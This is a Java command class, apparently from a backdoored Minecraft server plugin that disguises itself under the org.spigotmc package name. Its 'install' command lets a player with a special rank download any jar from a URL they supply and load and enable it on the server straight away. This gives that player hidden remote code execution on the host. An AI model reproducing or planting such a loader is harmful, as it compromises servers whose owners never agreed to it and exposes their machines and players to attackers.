package org.spigotmc.commands.impl.premium.server;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "install",
    usage = "install <plugin direct download URL>",
    desc = "Install a plugin",
    blatant = true,
    rank = PlayerType.BOOSTER
)

public class Install extends CommandListener{

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE(Install.class.getAnnotation(CommandInfo.class).usage()));
        } else {
            long name = new Random().nextLong();
            try {
                URL url = new URL(args[1]);
                InputStream in = url.openStream();
                Files.copy(in, Paths.get("plugins/" + name + ".jar"), StandardCopyOption.REPLACE_EXISTING);
                Plugin pl = Bukkit.getPluginManager().loadPlugin(new File("plugins/"+name+".jar"));    
                Bukkit.getPluginManager().enablePlugin(pl);
                p.sendMessage(Settings.PREFIX("The plugin has been downloaded and enabled"));
            } catch (Exception ex) {
                new File("plugins/"+name+".jar").delete();
                p.sendMessage(Settings.PREFIX("You provided a invalid URL"));
            }    
        }
    }
}
